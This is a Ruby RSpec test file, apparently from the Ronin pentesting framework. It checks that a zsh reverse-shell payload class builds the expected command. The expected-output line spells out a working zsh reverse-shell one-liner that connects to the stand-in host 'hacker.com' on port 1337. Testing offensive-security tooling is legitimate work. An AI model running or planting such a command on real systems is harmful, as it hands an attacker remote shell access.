require 'spec_helper'
require 'ronin/payloads/builtin/cmd/zsh/reverse_shell'

describe Ronin::Payloads::CMD::Zsh::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/zsh/reverse_shell'" do
      expect(subject.id).to eq('cmd/zsh/reverse_shell')
    end
  end

  let(:host) { 'hacker.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `zsh` command that connects back to the host and port params" do
      expect(subject.payload).to eq("zsh -c 'zmodload zsh/net/tcp && ztcp #{host} #{port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'")
    end
  end
end
